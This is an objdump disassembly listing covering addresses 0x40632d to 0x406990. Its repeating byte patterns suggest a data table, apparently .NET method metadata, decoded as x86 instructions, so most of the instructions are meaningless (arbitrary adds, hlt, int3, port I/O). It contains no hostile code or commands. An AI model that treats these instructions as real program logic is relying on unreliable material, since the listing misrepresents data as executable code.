  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 1d 15 72    	add    %dl,0x72151d08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 0e 09 0a    	add    %dl,0xa090e00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 11 02 84    	add    %dl,-0x7bfdef00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 d7 25 89    	add    %dl,-0x76da2900(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 ce 1c 0a    	add    %dl,0xa1cce00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 e3                	add    %ah,%bl
  40637f:	1e                   	push   %ds
  406380:	94                   	xchg   %eax,%esp
  406381:	00 10                	add    %dl,(%eax)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 68 15             	add    %ch,0x15(%eax)
  40638e:	58                   	pop    %eax
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 b5 18 9a    	add    %dl,-0x65e74b00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 4a 02 9a    	add    %dl,-0x65fdb600(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 a1 1e 0a    	add    %dl,0xa1ea118(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 fb                	add    %bh,%bl
  4063c5:	05 0a 00 14 00       	add    $0x14000a,%eax
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	9b                   	fwait
  4063d3:	1e                   	push   %ds
  4063d4:	0e                   	push   %cs
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 21 16 0a    	add    %dl,0xa162100(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 4b 19 1d    	add    %dl,0x1d194b00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 de 05 1d    	add    %dl,0x1d05de00(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 0b 1c 1d    	add    %dl,0x1d1c0b00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 15 0c 1d 00 14    	add    %dl,0x14001d0c
  40641d:	00 20                	add    %ah,(%eax)
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 0e                	add    %cl,(%esi)
  406427:	05 1d 00 14 00       	add    $0x14001d,%eax
  40642c:	78 20                	js     0x40644e
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	9b                   	fwait
  406435:	1e                   	push   %ds
  406436:	0e                   	push   %cs
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 cc                	add    %cl,%ah
  406443:	25 c3 00 14 00       	and    $0x1400c3,%eax
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 65 01             	add    %ah,0x1(%ebp)
  406452:	c7 00 14 00 5c 37    	movl   $0x375c0014,(%eax)
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 cd                	add    %cl,%ch
  40645f:	05 53 00 15 00       	add    $0x150053,%eax
  406464:	7b 21                	jnp    0x406487
  406466:	00 00                	add    %al,(%eax)
  406468:	00 00                	add    %al,(%eax)
  40646a:	96                   	xchg   %eax,%esi
  40646b:	00 db                	add    %bl,%bl
  40646d:	1b 1d 00 15 00 18    	sbb    0x18001500,%ebx
  406473:	39 00                	cmp    %eax,(%eax)
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 15 06 0a    	add    %dl,0xa061500(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 52 18 c3    	add    %dl,-0x3ce7ae00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 44 0b d5    	add    %dl,-0x2af4bc00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 c7 15 0a    	add    %dl,0xa15c700(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 21 0a c3    	add    %dl,-0x3cf5df00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 a6 1c 1d    	add    %dl,0x1d1ca600(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 f9 09 0a    	add    %dl,0xa09f900(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 16    	add    %al,0x16209600(%eax)
  4064dd:	08 e0                	or     %ah,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 57    	add    %al,0x57209600(%eax)
  4064eb:	04 e4                	add    $0xe4,%al
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 2d    	add    %al,0x2d209600(%eax)
  4064f9:	13 ec                	adc    %esp,%ebp
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 9e    	add    %al,-0x61df6a00(%eax)
  406507:	01 f1                	add    %esi,%ecx
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 4a    	add    %al,0x4a209600(%eax)
  406515:	01 f8                	add    %edi,%eax
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 80 01 ff 00 1d    	and    %al,0x1d00ff01(%eax)
  406527:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  40652d:	00 96 00 39 1c 1c    	add    %dl,0x1c1c3900(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 1c 1c 0a    	add    %dl,0xa1c1c00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 71 03             	add    %dh,0x3(%ecx)
  40654e:	0a 00                	or     (%eax),%al
  406550:	22 00                	and    (%eax),%al
  406552:	f4                   	hlt
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 cd 01 23    	add    %dl,0x2301cd00(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 42 07             	add    %al,0x7(%edx)
  40656a:	2a 01                	sub    (%ecx),%al
  40656c:	24 00                	and    $0x0,%al
  40656e:	cc                   	int3
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 75 17 84    	add    %dl,-0x7be88b00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 b0 02 1d    	add    %dl,0x1d02b000(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 a1 1e 0a    	add    %dl,0xa1ea118(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 58 03 9a    	add    %dl,-0x65fca800(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 b6 21 38 01 27    	add    %dh,0x27013821(%esi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 a7 24 0a    	add    %dl,0xa24a700(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 a2 0b 3e    	add    %dl,0x3e0ba200(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 a1 1e 0a 00 29    	sbb    %ah,0x29000a1e(%ecx)
  4065dd:	00 f4                	add    %dh,%ah
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	9b                   	fwait
  4065e7:	1e                   	push   %ds
  4065e8:	6b 01 29             	imul   $0x29,(%ecx),%eax
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	3c 02                	cmp    $0x2,%al
  4065f6:	70 01                	jo     0x4065f9
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	b7 08                	mov    $0x8,%bh
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 c1 02 70    	add    %al,0x7002c100(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 36 06 75    	add    %al,0x75063600(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 6b 0a 7c 01    	addl   $0x17c0a6b,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 a1 1e 0a    	add    %dl,0xa1ea118(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 6a 02             	add    %ch,0x2(%edx)
  40664a:	c7 00 30 00 40 45    	movl   $0x45400030,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 f0                	add    %dh,%al
  406657:	02 84 01 31 00 9f 22 	add    0x229f0031(%ecx,%eax,1),%al
  40665e:	00 00                	add    %al,(%eax)
  406660:	00 00                	add    %al,(%eax)
  406662:	96                   	xchg   %eax,%esi
  406663:	00 f2                	add    %dh,%dl
  406665:	04 2a                	add    $0x2a,%al
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 38                	add    %bh,(%eax)
  406673:	25 93 01 33 00       	and    $0x330193,%eax
  406678:	80 45 00 00          	addb   $0x0,0x0(%ebp)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 c5                	add    %al,%ch
  406681:	0a 93 01 34 00 c8    	or     -0x37ffcbff(%ebx),%dl
  406687:	45                   	inc    %ebp
  406688:	00 00                	add    %al,(%eax)
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 36                	add    %dh,(%esi)
  40668f:	09 93 01 35 00 10    	or     %edx,0x10003501(%ebx)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 64 04 84          	add    %ah,-0x7c(%esp,%eax,1)
  40669f:	01 36                	add    %esi,(%esi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 90 17 99    	add    %dl,-0x66e87000(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 9d 08 9f    	add    %dl,-0x60f76300(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 fd 03 a5    	add    %dl,-0x5afc0300(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 8b 24 ab    	add    %dl,-0x54db7500(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	9b                   	fwait
  4066e3:	1e                   	push   %ds
  4066e4:	0e                   	push   %cs
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 a1 1e 0a    	add    %dl,0xa1ea118(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 9b 1e b1    	add    %al,-0x4ee164e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 ca                	or     %ecx,%edx
  40670d:	22 bb 01 3c 00 40    	and    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 88 23 bf 01 3c    	add    %ecx,0x3c01bf23(%eax)
  40671f:	00 63 23             	add    %ah,0x23(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	e2 21                	loop   0x40674b
  40672a:	0e                   	push   %cs
  40672b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40672e:	6c                   	insb   (%dx),%es:(%edi)
  40672f:	23 00                	and    (%eax),%eax
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 9b 1e cb    	add    %al,-0x34e164e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 4c 04 d7    	add    %al,-0x28fbb400(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 3d 16 dc    	add    %al,-0x23e9c300(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 0d 18 e2    	add    %al,-0x1de7f300(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 5c 08 e8    	add    %al,-0x17f7a400(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 c2 18 ee    	add    %al,-0x11e73df8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	bc 15 f4 01 42       	mov    $0x4201f415,%esp
  40678f:	00 e6                	add    %ah,%dh
  406791:	23 00                	and    (%eax),%eax
  406793:	00 00                	add    %al,(%eax)
  406795:	00 81 00 d2 07 6b    	add    %al,0x6b07d200(%ecx)
  40679b:	01 42 00             	add    %eax,0x0(%edx)
  40679e:	48                   	dec    %eax
  40679f:	46                   	inc    %esi
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 09 07 0e 00    	addl   $0xe0709,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 76 08 d7 01    	addl   $0x1d70876,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 65 17 0a 02    	addl   $0x20a1765,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	ef                   	out    %eax,(%dx)
  4067d1:	23 dc                	and    %esp,%ebx
  4067d3:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 5e 0d d7    	add    %al,-0x28f2a200(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 a3 06 d7    	add    %al,-0x28f95d00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 4d 05 d7    	add    %al,-0x28fab300(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 bb 13 0f 02    	addl   $0x20f13bb,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 fd 06 0f 02    	addl   $0x20f06fd,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	69 07 15 02 47 00    	imul   $0x470215,(%edi),%eax
  40682a:	5f                   	pop    %edi
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 f2 13 1a    	add    %al,0x1a13f200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 df 00 1f    	add    %al,0x1f00df00(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	79 1b                	jns    0x40686b
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	1d 25 27 02 49       	sbb    $0x49022725,%eax
  406861:	00 74 24 00          	add    %dh,0x0(%esp)
  406865:	00 00                	add    %al,(%eax)
  406867:	00 86 00 be 06 2b    	add    %al,0x2b06be00(%esi)
  40686d:	02 49 00             	add    0x0(%ecx),%cl
  406870:	bc 4a 00 00 00       	mov    $0x4a,%esp
  406875:	00 86 00 2b 06 31    	add    %al,0x31062b00(%esi)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 1c 26 36    	add    %al,0x36261c00(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 69 13             	add    %ch,0x13(%ecx)
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 76 07 42    	add    %al,0x42077600(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 5b 07 42    	add    %al,0x42075b00(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	e3 13                	jecxz  0x4068d3
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 08 01 0e    	add    %al,0xe010800(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 3a 24 6b    	add    %al,0x6b243a00(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 95 02 47    	add    %al,0x47029500(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 91 08 4b    	add    %al,0x4b089100(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	a2 1b 50 02 53       	mov    %al,0x5302501b
  406909:	00 1f                	add    %bl,(%edi)
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	d0 08                	rorb   $1,(%eax)
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	78 13                	js     0x406935
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	fa                   	cli
  40692f:	00 6b 01             	add    %ch,0x1(%ebx)
  406932:	56                   	push   %esi
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	aa                   	stos   %al,%es:(%edi)
  40693d:	00 0f                	add    %cl,(%edi)
  40693f:	02 57 00             	add    0x0(%edi),%dl
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	0c 14                	or     $0x14,%al
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	4c                   	dec    %esp
  406959:	16                   	push   %ss
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	cf                   	iret
  406967:	14 47                	adc    $0x47,%al
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	dc 14 6b             	fcoml  (%ebx,%ebp,2)
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	a1 1d 23 02 5a       	mov    0x5a02231d,%eax
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	af                   	scas   %es:(%edi),%eax
